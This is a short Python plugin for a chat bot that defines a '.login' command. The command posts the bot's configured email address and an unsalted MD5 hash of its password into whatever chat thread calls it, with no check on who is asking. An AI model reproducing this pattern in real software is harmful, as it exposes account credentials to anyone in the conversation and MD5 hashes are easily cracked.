import hashlib
from steely import config

COMMAND = ".login"

def main(bot, author_id, thread_id, thread_type, **kwargs):
    bot.sendMessage("{} {}".format(config.EMAIL, hashlib.md5(config.PASSWORD.encode('utf-8')).hexdigest()), thread_id=thread_id, thread_type=thread_type)
